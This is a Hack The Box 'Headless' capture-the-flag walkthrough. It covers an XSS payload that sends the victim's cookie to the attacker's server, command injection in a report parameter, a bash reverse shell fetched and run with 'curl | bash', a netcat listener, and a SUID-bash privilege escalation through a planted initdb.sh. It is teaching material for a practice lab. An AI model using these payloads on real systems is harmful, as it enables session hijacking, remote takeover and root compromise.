# Headless | HTB
### Difficulty Level: Easy
-----------------------------------

First, start with nmap scan:

```bash
nmap -A -T4 -p- <target-machine> -oN headless.nmap
```

-A - aggressive scan.

-T4 - increases the speed of the scan.

-p- scans all port instead of the 1000 commons port.

-oN - saves the output to a file.


Results:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 900294283dab2274df0ea3b20f2bc617 (ECDSA)
|_  256 2eb90824021b609460b384a99e1a60ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Wed, 27 Mar 2024 17:51:40 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.93%I=7%D=3/27%Time=66045CA9%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x20
SF:Python/3\.11\.2\r\nDate:\x20Wed,\x2027\x20Mar\x202024\x2017:51:40\x20GM
SF:T\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:02799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Zfs;
SF:\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20
SF:lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20
SF:\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,
SF:\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construction
SF:</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20body
SF:\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20
SF:'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20displ
SF:ay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-c
SF:ontent:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ali
SF:gn-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h
SF:eight:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x200,\
SF:x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYPE\x
SF:20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\
SF:x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20respons
SF:e</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version
SF:\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20
SF:code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20u
SF:nsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/27%OT=22%CT=1%CU=31669%PV=Y%DS=2%DC=T%G=Y%TM=66045D1
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1
OS:1NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   64.64 ms 10.10.14.1
2   65.21 ms 10.129.120.97

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 27 13:53:20 2024 -- 1 IP address (1 host up) scanned in 181.72 seconds
```

There are 2 open ports:

22 - ssh

5000 - upnp but it looks like there is web page.

Let's browse into via port 5000:


![image](https://cdn-images-1.medium.com/max/1000/1*5AX-fC3cIiAXAwGDsu1KGQ.png)


Start gobuster scan to enumarate directories within the system:

```bash
gobuster dir -u http://<target-machine>:5000 -w /usr/share/wordlist/dirbuster/directory-list-lowercase-2.3-medium.txt
```

/dashboard status:500

/support status:200

navigate to /support and there is another webpage with inputs fields:


![image](https://cdn-images-1.medium.com/max/1000/1*GQldw8gK2wO07L-tEuPTDg.png)

The first thing that i thought about is xss. maybe we can hijack user's cookie to get into the dashboard page that is unauthoratized.

So enter inputs inside the field and try xss payload ti understand if the webpage is vulnerable to xss.

I used <script>alert(1)</script>.


![image](https://cdn-images-1.medium.com/max/1000/1*p421Q34mHbQDHth3zXlDkw.png)


This message tells us that it is vulnerable.

Ill use this payload to try cookie hijaching:

```bash
<img src=x onerror=fetch('http://<YourIP>/?c='+document.cookie);>
```

This payload is an html tage that creates reference to src that isn't exist which is "x". 
then, creates attribute "on error" that tells the fetch function to grab cookie from the ip-address that 
will be mentioned in case of error. now, because of src x isn't exist there is an error, and in case of error it pulls 
the cookie from the ip-address that has cookie within it.

**Ill use burp to create the modifications and get the responses.**

And open python http.server to grab the response to our server.

```bash
python3 -m http.server 80
```

I didn't get it with just write the payload within the message input so I try to write it within the user-agent
within the request too.

![image](https://cdn-images-1.medium.com/max/1000/1*uoDYuNFrg7U74zEbmyuAQQ.png)

After sending it, I got a cookie.

![image](https://cdn-images-1.medium.com/max/1000/1*443qDOfnStbXECLKBRsaqw.png)


Now, let's move to /dashboard and include the cookie inside the page.

so from unauthorized, we moved into the dashboard.


![image](https://cdn-images-1.medium.com/max/1000/1*zgdqSF_C2n03079ojjPjtw.png)


I clicked on generate report button and grab the request in burp.

There is a date parmater so try to run an os commands:

![image](https://cdn-images-1.medium.com/max/1000/1*cESek45-a5P__jktX1COHg.png)


```bash
"uname" command supposed to give us the name of os system that runs which is: linux
```

After sending the request with the command I could see the output of the command inside the response.


![image](https://cdn-images-1.medium.com/max/1000/1*BgdyTMFVleT5wYa6Fe7grA.png)


I tried to run reverse shell payload and it didn't work, so I created a file that includes 
reverse shell, open another http server to run a command that pulls the file and runs it:

First, The revshell file:

```bash
#/bin/bash
/bin/bash -c 'exec bash -i >& /dev/tcp/<tun-0>/3333 0>&1'
```

Second, open http server within the directory that includes the file.

```bash
python3 -m http.server 8000
```

third, set net listener:

```bash
nc -lnvp 3333
```

#4 action, run a command that pulls the file and runs it:

```bash
curl http:<tun-0>:8000/shell.sh |bash
```

results:

the request accomplished.
```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.8 - - [27/Mar/2024 17:03:02] "GET /shell.sh HTTP/1.1" 200 -
```

and there is a shell.

```bash
listening on [any] 3333 ...
connect to [tun-0] from (UNKNOWN) [10.10.11.8] 47140
bash: cannot set terminal process group (1360): Inappropriate ioctl for device
bash: no job control in this shell
dvir@headless:~/app$
```

Grab user.txt flag.

```bash
dvir@headless:~/app$ cat /home/dvir/user.txt
cat /home/dvir/user.txt
********************************
dvir@headless:~/app$
```

**escalate privilliges**

```bash
dvir@headless:~/app$ sudo -l
sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

We can escalate privilliges by exploit the syscheck binary file.

read syscheck file:

```
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

There is a file initdb.sh that can help us. the binary runs it.

```bash
echo "chmod u+s /bin/bash" > initdb.sh
```

When the setuid bit is set on an executable file,
the program will be executed with the privileges of the owner of the file
(in this case, the root user) rather than the privileges of the user executing the file.

give it execute permission with:

```bash
chmod +x initdb.sh
```

run the syscheck file with our new escalation.

```bash
sudo /usr/bin/syscheck
```

then run:

```bash
/bin/bash -p
```

and we are root.

```bash
dvir@headless:~/app$ sudo /usr/bin/syscheck
sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.6G
System load average:  1.30, 1.33, 1.04
Database service is not running. Starting it...
dvir@headless:~/app$ /bin/bash -p
/bin/bash -p
whoami
root
```

Grab root.txt flag:

```bin
cat /root/root.txt
********************************
```

THE END!

***Written by Alon Presman, Penetration Tester and Ethical Hacker.***











































































